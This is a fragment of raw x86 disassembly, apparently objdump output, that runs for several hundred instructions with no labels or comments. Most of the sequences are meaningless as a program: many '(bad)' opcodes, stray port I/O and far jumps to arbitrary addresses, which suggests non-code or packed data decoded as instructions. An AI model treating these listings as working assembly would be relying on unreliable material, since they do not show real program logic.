  40755f:	mov    eax,ds:0xe04044f7
  407564:	jmp    0xc51674ea
  407569:	jb     0x4075e1
  40756b:	(bad)  
  40756c:	mov    bh,0xb6
  40756e:	into   
  40756f:	sti    
  407570:	data16 js 0x4075e1
  407573:	jl     0x407534
  407575:	mov    ah,0xf5
  407577:	sub    eax,0x11b8351e
  40757c:	lods   eax,DWORD PTR ds:[esi]
  40757d:	mov    ebx,0xe2a80342
  407582:	cmp    ebx,ebx
  407584:	inc    ebp
  407585:	xchg   ecx,eax
  407586:	mov    edx,0xe0541ef
  40758b:	sbb    BYTE PTR [edx],dh
  40758d:	jecxz  0x40754c
  40758f:	daa    
  407590:	ins    DWORD PTR es:[edi],dx
  407591:	xor    eax,0x84c50467
  407596:	sbb    BYTE PTR [esi],0x91
  407599:	gs out dx,al
  40759b:	dec    ecx
  40759c:	gs cmp eax,0x91dc8b94
  4075a2:	dec    ebx
  4075a3:	addr16 mov dh,0x0
  4075a6:	lods   eax,DWORD PTR ds:[esi]
  4075a7:	xchg   esi,eax
  4075a8:	in     eax,dx
  4075a9:	xchg   esp,eax
  4075aa:	jg     0x4075aa
  4075ac:	dec    edx
  4075ad:	sbb    esp,esi
  4075af:	pop    ecx
  4075b0:	sbb    DWORD PTR [ebp+0x12a2ce06],0x313f4ccf
  4075ba:	pop    edx
  4075bb:	mov    cl,0x8c
  4075bd:	out    0xcf,al
  4075bf:	mov    al,0x51
  4075c1:	xchg   esp,eax
  4075c2:	adc    al,0x15
  4075c4:	cli    
  4075c5:	pop    ebp
  4075c6:	cmovns ebp,DWORD PTR [esi+0x5725219f]
  4075cd:	and    eax,0x3b6ce438
  4075d2:	imul   ebp,DWORD PTR [ecx+0x6c9c89bc],0x2e
  4075d9:	push   edx
  4075da:	fmul   QWORD PTR [ecx-0x773ea02]
  4075e0:	test   DWORD PTR [ebx-0x4b3ca39c],ebp
  4075e6:	dec    edi
  4075e7:	out    dx,eax
  4075e8:	sbb    esp,ecx
  4075ea:	mov    DWORD PTR ds:0x53ddfd51,0x3c1177b9
  4075f4:	sub    al,0x89
  4075f6:	popf   
  4075f7:	scas   eax,DWORD PTR es:[edi]
  4075f8:	clc    
  4075f9:	mov    gs:0xda99bd94,eax
  4075ff:	or     al,0xa7
  407601:	xor    DWORD PTR [edx+0x58],edi
  407604:	into   
  407605:	into   
  407606:	adc    dh,bl
  407608:	call   0xd20f8555
  40760d:	aaa    
  40760e:	and    BYTE PTR [ebx-0x1a],dh
  407611:	retf   0xbd13
  407614:	iret   
  407615:	les    ebp,FWORD PTR [esi]
  407617:	xor    esp,DWORD PTR [edi+0x1f]
  40761a:	mov    ds:0x3857706,al
  40761f:	or     al,0xb1
  407621:	repnz ins DWORD PTR es:[edi],dx
  407623:	retf   
  407624:	push   eax
  407625:	mov    bl,0x82
  407627:	xor    DWORD PTR [eax],edi
  407629:	xor    eax,0xaff7368
  40762e:	mov    ah,0xce
  407630:	push   cs
  407631:	add    al,0x58
  407633:	xor    DWORD PTR [ecx-0x7d],0x20ba6785
  40763a:	enter  0x3f56,0x82
  40763e:	ja     0x40768c
  407640:	into   
  407641:	mov    DWORD PTR [edx],edi
  407643:	loopne 0x407655
  407645:	mov    eax,ds:0xba4bc4ba
  40764a:	mov    es,WORD PTR [ebx+0x75]
  40764d:	pushf  
  40764e:	adc    dl,al
  407650:	fld    TBYTE PTR [eax-0x6a5a2a5e]
  407656:	adc    DWORD PTR [edi+0x7a84858a],ebp
  40765c:	stos   DWORD PTR es:[edi],eax
  40765d:	jae    0x4076dd
  40765f:	fcomip st,st(2)
  407661:	pusha  
  407662:	out    0x7,al
  407664:	mov    ah,0xe7
  407666:	mov    al,ds:0x30452245
  40766b:	mov    bh,0x7e
  40766d:	aas    
  40766e:	clc    
  40766f:	push   edx
  407670:	xor    ch,dl
  407672:	lock add BYTE PTR [ebp+0x7029a375],al
  407679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767a:	test   al,0x74
  40767c:	fwait
  40767d:	adc    BYTE PTR [edx-0x2b],dh
  407680:	bound  edi,QWORD PTR [ebp-0x1c]
  407683:	retf   0x2ca6
  407686:	mov    ds:0xb5df9cfe,eax
  40768b:	xchg   BYTE PTR [ebx-0x6042f58e],bl
  407691:	push   esi
  407692:	dec    BYTE PTR [esi]
  407694:	cwde   
  407695:	mov    ecx,0x94ec5fc9
  40769a:	pop    ds
  40769b:	bound  eax,QWORD PTR [esi]
  40769d:	mov    esi,cs
  40769f:	pusha  
  4076a0:	scas   eax,DWORD PTR es:[edi]
  4076a1:	mov    dh,0xaa
  4076a3:	(bad)  
  4076a4:	nop
  4076a5:	mov    dh,0xc7
  4076a7:	adc    ah,ch
  4076a9:	imul   esp,DWORD PTR [edi+eax*4-0x6],0x17
  4076ae:	xchg   ecx,eax
  4076af:	dec    edi
  4076b0:	jl     0x407667
  4076b2:	add    edx,DWORD PTR [esi+0x7d6de633]
  4076b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076b9:	cmp    BYTE PTR [ebp-0x13],ah
  4076bc:	mov    cl,0x0
  4076be:	cwde   
  4076bf:	jmp    0x407690
  4076c1:	and    DWORD PTR [edx+esi*1],0x145dc6a
  4076c8:	dec    edx
  4076c9:	arpl   ax,di
  4076cb:	jmp    0x407693
  4076cd:	dec    ebx
  4076ce:	call   FWORD PTR [esi+esi*2]
  4076d1:	xchg   ebp,eax
  4076d2:	or     BYTE PTR [ecx+0x34],cl
  4076d5:	xor    DWORD PTR [esp+ecx*1],ecx
  4076d8:	out    dx,eax
  4076d9:	mov    gs,WORD PTR cs:[edx]
  4076dc:	mov    ecx,0x43c89fb6
  4076e1:	int3   
  4076e2:	and    dl,bl
  4076e4:	cs sub eax,0xe1c1a63f
  4076ea:	mov    edi,edi
  4076ec:	pop    ecx
  4076ed:	and    eax,0x9c3af24b
  4076f2:	call   0xb38e871f
  4076f7:	inc    ecx
  4076f8:	stos   BYTE PTR es:[edi],al
  4076f9:	and    eax,0x810bde87
  4076fe:	lods   al,BYTE PTR ds:[esi]
  4076ff:	and    esp,ebp
  407701:	in     al,0xd7
  407703:	in     al,0xa2
  407705:	js     0x40773d
  407707:	stc    
  407708:	mov    gs:0x8e1f32b3,eax
  40770e:	cmp    DWORD PTR [ebx+0x37],esp
  407711:	pop    ebx
  407712:	mov    ds:0x771c54cd,al
  407717:	mov    ecx,0x5fb0365a
  40771c:	dec    ebx
  40771d:	and    ah,BYTE PTR [ecx]
  40771f:	xor    eax,0xac239b23
  407724:	pop    ebx
  407725:	out    dx,eax
  407726:	daa    
  407727:	sahf   
  407728:	and    dh,bh
  40772a:	std    
  40772b:	es ins DWORD PTR es:[edi],dx
  40772d:	fcomp  QWORD PTR [eax]
  40772f:	jl     0x407708
  407731:	out    0xf9,eax
  407733:	adc    DWORD PTR [ebx-0x69],edi
  407736:	jae    0x407798
  407738:	out    0xec,al
  40773a:	sbb    DWORD PTR [esi+ebp*4-0x52],0xd4960795
  407742:	xchg   edi,eax
  407743:	push   cs
  407744:	inc    esi
  407745:	inc    eax
  407746:	call   0xf6fec36d
  40774b:	add    BYTE PTR [ecx-0x50bed69f],dl
  407751:	ss mov ebx,0x8c97bfda
  407757:	mov    cl,BYTE PTR [edi-0x296a361f]
  40775d:	mov    ds:0x5e173fd0,al
  407762:	jns    0x407741
  407764:	sahf   
  407765:	adc    ah,dl
  407767:	cmc    
  407768:	loope  0x4077bd
  40776a:	das    
  40776b:	mov    ebx,0x5e3e921b
  407770:	mov    al,ds:0x9369597a
  407775:	adc    bh,BYTE PTR [ebp-0x20]
  407778:	es (bad) 
  40777a:	enter  0xaf34,0xe7
  40777e:	stc    
  40777f:	outs   dx,DWORD PTR ds:[esi]
  407780:	iret   
  407781:	xlat   BYTE PTR ds:[ebx]
  407782:	push   ecx
  407783:	pushf  
  407784:	leave  
  407785:	push   es
  407786:	mov    ch,0x97
  407788:	je     0x407787
  40778a:	fs gs fs ffree st(6)
  40778f:	sbb    BYTE PTR [edx-0x23],ah
  407792:	(bad)  
  407793:	push   ebp
  407794:	retf   0x24a
  407797:	mov    WORD PTR [edx+edi*1],cs
  40779a:	jle    0x4077bb
  40779c:	outs   dx,BYTE PTR ds:[esi]
  40779d:	mov    eax,ss:0x8913d1fc
  4077a3:	pop    edi
  4077a4:	push   eax
  4077a5:	pop    edx
  4077a6:	adc    ch,al
  4077a8:	scas   eax,DWORD PTR es:[edi]
  4077a9:	dec    esi
  4077aa:	cli    
  4077ab:	sahf   
  4077ac:	jecxz  0x407781
  4077ae:	cmp    BYTE PTR [edx+0x515a0154],0x9c
  4077b5:	cs push eax
  4077b7:	call   0x82bb6f0e
  4077bc:	test   DWORD PTR [ebx],edx
  4077be:	sub    bl,BYTE PTR [ebp+0x3512b4d]
  4077c4:	xor    DWORD PTR [ebp-0x18c89561],ecx
  4077ca:	push   0x1b
  4077cc:	xchg   ebp,eax
  4077cd:	pop    ss
  4077ce:	inc    esp
  4077cf:	hlt    
  4077d0:	sub    eax,0xcb9684d9
  4077d5:	inc    esi
  4077d6:	mov    esi,DWORD PTR ds:0x26e7967d
  4077dc:	jle    0x4077f6
  4077de:	int3   
  4077df:	ja     0x407808
  4077e1:	inc    esi
  4077e2:	popf   
  4077e3:	inc    ecx
  4077e4:	adc    dl,dl
  4077e6:	cmp    eax,0x2350319b
  4077eb:	inc    eax
  4077ec:	arpl   WORD PTR [edx+0x4],si
  4077ef:	js     0x407839
  4077f1:	repz jmp 0x3e3d:0x285ddc28
  4077f9:	mov    eax,0x55709fbc
  4077fe:	fs jnp 0x40786b
  407801:	xor    esp,DWORD PTR [ecx-0x9d43155]
  407807:	jnp    0x407856
  407809:	test   DWORD PTR ds:0xf6ba661f,esp
  40780f:	outs   dx,BYTE PTR ds:[esi]
  407810:	xlat   BYTE PTR ds:[ebx]
  407811:	inc    ecx
  407812:	aaa    
  407813:	dec    esi
  407814:	lahf   
  407815:	(bad)  
  407816:	and    al,0xc0
  407818:	icebp  
  407819:	fistp  QWORD PTR [ecx+0x53]
  40781c:	mov    eax,0x8d22c399
  407821:	push   0x48817fb5
  407826:	push   esi
  407827:	sbb    BYTE PTR [edi+esi*2+0x1937e9e5],ah
  40782e:	xchg   ecx,eax
  40782f:	jbe    0x4077ea
  407831:	ins    DWORD PTR es:[edi],dx
  407832:	(bad)  
  407833:	mov    al,0xa4
  407835:	into   
  407836:	nop
  407837:	mov    esi,0xdd21a6a3
  40783c:	rcl    edx,cl
  40783e:	dec    esi
  40783f:	scas   al,BYTE PTR es:[edi]
  407840:	mov    bh,0x70
  407842:	xchg   DWORD PTR [edx+ebx*1],eax
  407845:	jmp    0x769da23c
  40784a:	cwde   
  40784b:	idiv   BYTE PTR [edx-0x14]
  40784e:	sub    eax,eax
  407850:	push   0x64717b9c
  407855:	retf   
  407856:	cmp    BYTE PTR [esi+ecx*2-0x11],0x12
  40785b:	jmp    0xa894:0xb8b71363
  407862:	dec    esi
  407863:	arpl   WORD PTR [ebp-0x6d],di
  407866:	cld    
  407867:	faddp  st(5),st
  407869:	stos   BYTE PTR es:[edi],al
  40786a:	add    bh,bh
  40786c:	jg     0x407875
  40786e:	ret    0x9f28
  407871:	xor    esp,ebp
  407873:	jecxz  0x4078c0
  407875:	repz test eax,0xa560b38
  40787b:	dec    esi
  40787c:	adc    al,0x7c
  40787e:	ficomp DWORD PTR [eax-0x7e84d0df]
  407884:	or     esi,DWORD PTR [esi-0x4a]
  407887:	or     ecx,ecx
  407889:	es jg  0x407880
  40788c:	add    ch,BYTE PTR [edx+ebx*2-0x4c]
  407890:	hlt    
  407891:	mov    ebp,DWORD PTR [ebp+0x46ff5de2]
  407897:	ror    DWORD PTR [ecx],1
  407899:	pop    ecx
  40789a:	adc    eax,0x2c2ea5b9
  40789f:	daa    
  4078a0:	adc    al,0x72
  4078a2:	into   
  4078a3:	sbb    eax,0x6b91782f
  4078a8:	jp     0x4078de
  4078aa:	add    bl,al
  4078ac:	sti    
  4078ad:	xor    DWORD PTR [edi+0x61],edx
  4078b0:	pop    ds
  4078b1:	ficomp WORD PTR [ecx-0x5f]
  4078b4:	call   0xacc68a16
  4078b9:	outs   dx,DWORD PTR ds:[esi]
  4078ba:	push   0xa5c5fa62
  4078bf:	repz in al,0x5e
  4078c2:	pushf  
  4078c3:	push   ss
  4078c4:	in     eax,0xfb
  4078c6:	sahf   
  4078c7:	pop    esp
  4078c8:	push   eax
  4078c9:	inc    al
  4078cb:	(bad)  
  4078cd:	shl    DWORD PTR [edx-0x65],0x49
  4078d1:	sub    esp,DWORD PTR [esi]
  4078d3:	popf   
  4078d4:	stos   BYTE PTR es:[edi],al
  4078d5:	mov    ch,0x6e
  4078d7:	aaa    
  4078d8:	sub    ch,ah
  4078da:	nop
  4078db:	add    al,0xc7
  4078dd:	add    al,0x60
  4078df:	inc    edi
  4078e0:	adc    al,0xb3
  4078e2:	fnstsw WORD PTR [eax]
  4078e4:	and    eax,0x13035aea
  4078e9:	mov    ebp,ds
  4078eb:	xchg   edx,eax
  4078ec:	and    eax,0xe1a0b35c
  4078f1:	adc    DWORD PTR [ebp-0x27cd05da],esi
  4078f7:	push   cs
  4078f8:	lds    edi,FWORD PTR [eax+0x2e]
  4078fb:	pop    ds
  4078fc:	mov    ecx,ebp
  4078fe:	dec    edx
  4078ff:	cmp    bl,BYTE PTR [ecx]
  407901:	xchg   DWORD PTR [edi-0x58],edi
  407904:	xchg   esi,eax
  407905:	adc    al,0x4d
  407907:	sub    DWORD PTR [eax],0xda1d5604
  40790d:	dec    esp
  40790e:	iret   
  40790f:	call   0x360d4e0d
  407914:	xor    BYTE PTR [ebx-0x25d9de1c],cl
  40791a:	xor    eax,0x205a5f14
  40791f:	jmp    0x4078da
  407921:	cmp    bh,dh
  407923:	jb     0x407998
  407925:	bound  ebx,QWORD PTR [esi-0x171b5c4b]
  40792b:	adc    DWORD PTR [edi+0x4004bd46],edi
  407931:	sbb    DWORD PTR [eax+0x1d983ecd],esi
  407937:	xchg   edi,eax
  407938:	cdq    
  407939:	lods   al,BYTE PTR ds:[esi]
  40793a:	pop    ss
  40793b:	in     eax,dx
  40793c:	mov    eax,ds:0xae9072a7
  407941:	xlat   BYTE PTR ds:[ebx]
  407942:	mul    DWORD PTR [ecx+0x6318b611]
  407948:	adc    BYTE PTR [ebp+0x21c001cb],cl
  40794e:	imul   edx,DWORD PTR ds:0xb3187f53,0x4ffde2f7
  407958:	push   ecx
  407959:	ins    DWORD PTR es:[edi],dx
  40795a:	mov    BYTE PTR [ecx+0x1ad9c04a],cl
  407960:	xchg   BYTE PTR [ebp+0x34],ch
  407963:	(bad)  
  407964:	leave  
  407965:	xor    eax,0x1e50e895
  40796a:	in     al,0xd6
  40796c:	push   ss
  40796d:	and    DWORD PTR [ecx-0x1a3b4022],0xbae79c31
  407977:	lahf   
  407978:	mov    dl,0x8f
  40797a:	xchg   edx,eax
  40797b:	sbb    al,BYTE PTR [eax+0x4c]
  40797e:	in     al,0xf6
  407980:	pop    ebx
  407981:	mov    ecx,?
  407983:	call   0x90f1:0xc227c295
  40798a:	jae    0x4079a1
  40798c:	xchg   DWORD PTR ds:0xc13a3d4c,esp
  407992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407993:	popf   
  407994:	sahf   
  407995:	mov    dl,0xfb
  407997:	or     BYTE PTR ds:0x829adb63,0xc0
  40799e:	xor    bl,bl
  4079a0:	aad    0x8b
  4079a2:	dec    BYTE PTR [ecx+0x35]
  4079a5:	sub    eax,0x26a8f238
  4079aa:	pop    esi
  4079ab:	push   esi
  4079ac:	cmp    cl,BYTE PTR [ecx+0x54240aac]
  4079b2:	push   eax
  4079b3:	push   0x40
  4079b5:	int3   
  4079b6:	(bad)  
  4079b7:	stos   DWORD PTR es:[edi],eax
  4079b8:	and    eax,0x57152b4a
  4079bd:	or     esp,ebx
  4079bf:	xchg   esp,eax
  4079c0:	mov    cl,0xba
  4079c2:	outs   dx,DWORD PTR ds:[esi]
  4079c3:	js     0x407a14
  4079c5:	push   ecx
  4079c6:	pusha  
  4079c7:	sbb    ebp,0x2d2916b4
  4079cd:	repnz mov BYTE PTR [eax+0x14],bl
  4079d1:	leave  
  4079d2:	out    0xf8,eax
  4079d4:	fidiv  WORD PTR [esi-0x36b061a5]
  4079da:	dec    eax
  4079db:	add    al,0x51
  4079dd:	gs xchg ebp,eax
  4079df:	or     bl,BYTE PTR [eax]
  4079e1:	dec    ecx
  4079e2:	pushf  
  4079e3:	out    dx,al
  4079e4:	pop    es
  4079e5:	dec    edx
  4079e6:	popf   
  4079e7:	dec    eax
  4079e8:	pop    ebx
  4079e9:	add    al,0x1c
  4079eb:	sbb    ebp,esp
  4079ed:	push   edi
  4079ee:	mov    esi,0x64b45b50
  4079f3:	push   ebp
  4079f4:	aad    0x32
  4079f6:	cdq    
  4079f7:	mov    edx,DWORD PTR [edx]
  4079f9:	sub    BYTE PTR [esi+0x5779ab],bh
  4079ff:	push   eax
  407a00:	and    cl,ch
  407a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a03:	and    esi,ebp
  407a05:	cmp    ecx,DWORD PTR [esi+ecx*2+0x6f]
  407a09:	jbe    0x4079f4
  407a0b:	lods   eax,DWORD PTR ds:[esi]
  407a0c:	xor    DWORD PTR [eax+0x7b],0x3
  407a10:	imul   esp,DWORD PTR [ebp-0x51],0x432b05ce
  407a17:	xchg   ebx,eax
  407a18:	stc    
  407a19:	je     0x4079e1
  407a1b:	push   eax
  407a1c:	pop    eax
  407a1d:	icebp  
  407a1e:	mov    ebp,0xf52f9bbd
  407a23:	inc    ebx
  407a24:	push   ecx
  407a25:	xchg   ebp,eax
  407a26:	push   edx
  407a27:	addr16 cmc 
  407a29:	ins    DWORD PTR es:[edi],dx
  407a2a:	sbb    ah,0x33
  407a2d:	ret    0xd1b5
  407a30:	push   ebx
  407a31:	jp     0x4079b7
  407a33:	fmul   DWORD PTR [edx]
  407a35:	imul   edi,DWORD PTR [ecx+ecx*2-0x7a],0xffffffdd
  407a3a:	mov    edx,0x37dece73
  407a3f:	jno    0x407a6f
  407a41:	stos   DWORD PTR es:[edi],eax
  407a42:	int3   
  407a43:	leave  
  407a44:	popa   
  407a45:	ja     0x407a03
  407a47:	arpl   WORD PTR [ebx+0x15],ax
  407a4a:	mov    ds:0xed823d7e,eax
  407a4f:	sbb    eax,0x5b80f6e4
  407a54:	test   eax,0xdc3fbfd7
  407a59:	mov    WORD PTR [esi-0x69],ds
  407a5c:	int3   
  407a5d:	adc    bh,BYTE PTR [ebp-0x6e]
  407a60:	stc    
  407a61:	sub    BYTE PTR [edi],bl
  407a63:	fnstenv [esi]
  407a65:	sbb    eax,eax
  407a67:	aad    0x6f
  407a69:	div    ecx
  407a6b:	and    eax,esi
  407a6d:	lahf   
  407a6e:	je     0x407a72
  407a70:	clc    
  407a71:	fbstp  TBYTE PTR [edi+ecx*1+0x4f89c757]
  407a78:	int    0x8f
  407a7a:	lds    edx,FWORD PTR [ecx]
  407a7c:	mov    eax,ds:0xbb4aa70c
  407a81:	(bad)  
  407a82:	mov    eax,0x9250eea8
  407a87:	xchg   ebp,eax
  407a88:	cmp    eax,DWORD PTR [esi+0x16905cd1]
  407a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8f:	push   0x9
  407a91:	jg     0x407a3b
  407a93:	dec    esp
  407a94:	mov    dh,BYTE PTR [ebp+eiz*8+0x2a]
  407a98:	cwde   
  407a99:	add    ebx,DWORD PTR [ebx]
  407a9b:	adc    al,0xbb
  407a9d:	jne    0x407b0d
  407a9f:	icebp  
  407aa0:	jp     0x407ae7
  407aa2:	out    0x0,eax
  407aa4:	inc    ecx
  407aa5:	sub    BYTE PTR [ebx+0x7b254be4],bh
  407aab:	jmp    0xcbed:0xeb13f4a2
  407ab2:	sbb    BYTE PTR [esi-0xe6b58f7],dl
  407ab8:	mov    dh,0x69
  407aba:	test   DWORD PTR [edx],eax
  407abc:	inc    ecx
  407abd:	(bad)  
  407abf:	mov    esi,0x2ae6ec37
  407ac4:	mov    edx,0x57edc1e9
  407ac9:	jge    0x407b28
  407acb:	or     ch,al
  407acd:	cmp    al,0x9
  407acf:	ja     0x407af6
  407ad1:	adc    BYTE PTR [ecx+0x29d4138f],bl
  407ad7:	mov    fs,ebx
  407ad9:	fcmovnu st,st(1)
  407adb:	xchg   ecx,eax
  407adc:	cld    
  407add:	push   ebx
  407ade:	or     BYTE PTR [ebp-0x76cb6957],ch
  407ae4:	jnp    0x407b46
  407ae6:	gs aam 0x42
  407ae9:	ret    
  407aea:	outs   dx,BYTE PTR ds:[esi]
  407aec:	cmp    BYTE PTR [ebx-0x4e],bl
  407aef:	ins    DWORD PTR es:[edi],dx
  407af0:	shl    ecx,cl
  407af2:	js     0x407aff
  407af4:	mov    ds:0xe897db30,eax
  407af9:	inc    edi
  407afa:	test   bh,0x1f
  407afd:	pop    esi
  407afe:	test   DWORD PTR [ebp-0x4c],edi
  407b01:	push   ss
  407b02:	retf   
  407b03:	inc    ecx
  407b04:	shr    DWORD PTR [edx],1
  407b06:	mov    ds:0x168e636f,eax
  407b0b:	mov    ds:0x990ac12b,eax
  407b10:	jmp    0x407b47
  407b12:	mov    dh,BYTE PTR [esi+edx*1-0x40]
  407b16:	jecxz  0x407ac6
  407b18:	or     DWORD PTR [ebp+0x5],0x68
  407b1c:	(bad)  
  407b1d:	jge    0x407aba
  407b1f:	stc    
  407b20:	out    dx,al
  407b21:	(bad)  
  407b22:	rcr    DWORD PTR [ebx],1
  407b24:	dec    edi
  407b25:	fidiv  DWORD PTR [edi]
  407b27:	scas   eax,DWORD PTR es:[edi]
  407b28:	aas    
  407b29:	push   ebx
  407b2a:	pop    es
  407b2b:	aad    0x3
  407b2d:	pop    ebx
  407b2e:	(bad)  
  407b2f:	jo     0x407ab3
  407b31:	repnz cs aaa 
  407b34:	mov    BYTE PTR [ebp+edi*8-0x3e],dh
  407b38:	popf   
  407b39:	call   0x940fb9fc
  407b3e:	cli    
  407b3f:	add    al,0x37
  407b41:	int3   
  407b42:	push   di
  407b44:	inc    esi
  407b45:	in     al,dx
  407b46:	std    
  407b47:	in     al,dx
  407b48:	(bad)  
  407b49:	push   ecx
  407b4a:	lods   al,BYTE PTR ds:[esi]
  407b4b:	int    0x13
  407b4d:	fsubr  QWORD PTR [ebx+0x72]
  407b50:	mov    eax,ds:0xeaf3763d
  407b55:	mov    cl,0xed
  407b57:	arpl   WORD PTR [esi+0x20],di
  407b5a:	cmp    eax,0x77de9451
  407b5f:	or     DWORD PTR [ebp-0x27341aee],0xf3772328
  407b69:	xor    al,0xb
  407b6b:	sbb    ebx,ebp
  407b6d:	xor    BYTE PTR [esi+0x4a08b43e],0x80
  407b74:	mov    cl,0xe
  407b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b77:	pop    eax
  407b78:	call   0xa2be:0x8c97dfc9
  407b7f:	pop    ecx
  407b80:	cmp    bh,dh
  407b82:	daa    
  407b83:	ds mov ebp,0x794c3bd1
  407b89:	xlat   BYTE PTR ds:[ebx]
  407b8a:	pop    esi
  407b8b:	es pop es
  407b8d:	cmp    cl,BYTE PTR [ecx+esi*1-0x503f7898]
  407b94:	push   cs
  407b95:	pop    esp
  407b96:	mov    edx,0x1b884e30
  407b9b:	jl     0x407b60
  407b9d:	test   BYTE PTR [ecx+0x7d],0xc3
  407ba1:	push   ebx
  407ba2:	pop    edi
  407ba3:	jecxz  0x407c15
  407ba5:	repnz (bad) 
  407ba9:	fwait
  407baa:	and    cl,BYTE PTR [eax]
  407bac:	pop    ebx
  407bad:	xor    DWORD PTR [ecx+0x63659e41],0xc230cd28
  407bb7:	cli    
  407bb8:	push   edx
  407bb9:	sti    
  407bba:	xor    BYTE PTR [ebp+0x51],0x7c
  407bbe:	jecxz  0x407c21
  407bc0:	das    
  407bc1:	bound  esp,QWORD PTR [esi+0x3]
  407bc4:	ins    BYTE PTR es:[edi],dx
  407bc5:	rol    BYTE PTR [ecx-0xe],1
  407bc8:	cli    
  407bc9:	fbstp  TBYTE PTR [edx+0x6520f595]
  407bcf:	adc    esp,DWORD PTR [ebx+0x7e36adee]
  407bd5:	xchg   ecx,eax
  407bd6:	xchg   esi,eax
  407bd7:	cmc    
  407bd8:	adc    BYTE PTR [edi],dl
  407bda:	loope  0x407c0b
  407bdc:	repnz popa 
  407bde:	or     al,BYTE PTR [edi+0x4a84318f]
  407be4:	xchg   ebx,eax
  407be5:	sub    DWORD PTR [esi],eax
  407be7:	sbb    dl,BYTE PTR [eax-0x1a]
  407bea:	add    BYTE PTR [edi],bl
  407bec:	xchg   esi,eax
  407bed:	jns    0x407b94
  407bef:	inc    esi
  407bf0:	fyl2x  
  407bf2:	outs   dx,DWORD PTR ds:[esi]
  407bf3:	sbb    al,0x7d
  407bf5:	cmc    
  407bf6:	div    ebp
  407bf8:	sbb    edx,DWORD PTR [esi+0x46]
  407bfb:	or     bh,al
  407bfd:	addr16 in al,0xbf
  407c00:	or     BYTE PTR [esi-0x59],ah
  407c03:	inc    ebp
  407c04:	push   edx
  407c05:	or     al,0xd9
  407c07:	clc    
  407c08:	test   BYTE PTR [edi+0x10],bl
  407c0b:	mov    ds:0x781d4918,al
  407c10:	and    al,0xdc
  407c12:	dec    edi
  407c13:	jmp    0x62c8:0x7c5124d3
  407c1a:	mov    BYTE PTR [edx-0x61],cl
  407c1d:	rcr    BYTE PTR ds:0xc2b2ecc1,1
  407c23:	adc    al,BYTE PTR [esi]
  407c25:	(bad)  
  407c26:	mov    WORD PTR [ebx],ss
  407c28:	(bad)  
  407c29:	push   ebx
  407c2a:	push   ebp
  407c2b:	and    BYTE PTR [edx+0x62],0x7f
  407c2f:	jl     0x407bcf
  407c31:	(bad)  
  407c32:	jg     0x407c2b
  407c34:	ret    
  407c35:	xchg   esp,eax
  407c36:	ss cld 
  407c38:	cmp    DWORD PTR [ecx-0x38bee67b],ebp
  407c3e:	ins    DWORD PTR es:[edi],dx
  407c3f:	bnd call 0xe2808e89
  407c45:	sar    cl,cl
  407c47:	xor    BYTE PTR [edi+0xbd7376],bl
  407c4d:	add    al,0xec
  407c4f:	test   BYTE PTR [ebx],dl
  407c51:	dec    esi
  407c52:	call   0xbf6:0x206d4808
  407c59:	push   edx
  407c5a:	rep stos DWORD PTR es:[edi],eax
  407c5c:	in     eax,dx
  407c5d:	fisub  WORD PTR [edx-0xb028ca8]
  407c63:	mov    al,0x5
  407c65:	xchg   ecx,eax
  407c66:	retf   0xd532
  407c69:	adc    bh,BYTE PTR cs:[eax+0x4c726891]
  407c70:	enter  0x10c4,0xc2
  407c74:	xchg   esi,eax
  407c75:	(bad)  
  407c76:	(bad)  
  407c77:	aaa    
  407c78:	leave  
  407c79:	sbb    dl,ah
  407c7b:	in     eax,dx
  407c7c:	sbb    edx,0x8466aa3b
  407c82:	fstp   QWORD PTR [esi+eiz*4-0x4d]
  407c86:	xor    edi,DWORD PTR [esi-0xa]
  407c89:	push   edx
  407c8a:	and    dl,BYTE PTR ds:0xa1569dfd
  407c90:	adc    edi,edi
  407c92:	iret   
  407c93:	push   cs
  407c94:	or     bl,BYTE PTR [eax]
  407c96:	add    eax,0x2884f447
  407c9b:	mov    BYTE PTR [ecx-0x78],0xae
  407c9f:	or     eax,0x4e025503
  407ca4:	mov    ebx,0x7cadcafc
  407ca9:	repz pop es
  407cab:	test   al,0xe0
  407cad:	add    edi,ebp
  407caf:	frstor [esi+0x4e6cffba]
  407cb5:	dec    edx
  407cb6:	retf   0xbed2
  407cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cba:	push   eax
  407cbb:	inc    esi
  407cbc:	mov    edi,ecx
  407cbe:	lahf   
  407cbf:	jg     0x407c67
  407cc1:	push   edx
  407cc2:	xchg   DWORD PTR [edx],eax
  407cc4:	and    al,0xfd
  407cc6:	cli    
  407cc7:	mov    al,ds:0x67f203b2
  407ccc:	call   0xed70:0xb7710916
  407cd3:	pop    ds
  407cd4:	mov    eax,ds:0xefa634f6
  407cd9:	cmc    
  407cda:	inc    ebp
  407cdb:	sub    bl,BYTE PTR [edi+0x7821115]
  407ce1:	out    dx,al
  407ce2:	push   edi
  407ce3:	daa    
  407ce4:	jl     0x407d23
  407ce6:	add    DWORD PTR [edi+0x14],ebp
  407ce9:	mov    dh,0x11
  407ceb:	push   ebx
  407cec:	push   ebp
  407ced:	mov    ecx,0xf5026277
  407cf2:	push   0xfffffff9
  407cf4:	(bad)  [esi-0x75]
  407cf7:	ins    DWORD PTR es:[edi],dx
  407cf8:	adc    eax,DWORD PTR [ebp+0x4cc03afe]
  407cfe:	mov    WORD PTR [edi-0x4bcff254],ds
  407d04:	inc    edi
  407d05:	and    ebx,DWORD PTR [edi-0x560b7475]
  407d0b:	push   eax
  407d0c:	dec    eax
  407d0d:	xchg   esi,eax
  407d0e:	xchg   ebp,eax
  407d0f:	mov    WORD PTR [ecx+0x6d],?
  407d12:	xchg   esp,eax
  407d13:	or     eax,0xbe84c8e2
  407d18:	adc    al,0x7a
  407d1a:	jl     0x407d70
  407d1c:	or     DWORD PTR [edi+0x52],ebp
  407d1f:	ja     0x407d8e
  407d21:	f2xm1  
  407d23:	xor    dh,BYTE PTR [ebx+0x72]
  407d26:	bound  ecx,QWORD PTR [edi+0x2f]
  407d29:	mov    edi,0x9424a8d1
  407d2e:	fisubr DWORD PTR [edx]
  407d30:	mov    esp,0xb770b0f2
  407d35:	outs   dx,DWORD PTR ds:[esi]
  407d36:	loop   0x407ce0
  407d38:	aam    0x8c
  407d3a:	mov    bl,0x5d
  407d3c:	xor    al,0xcf
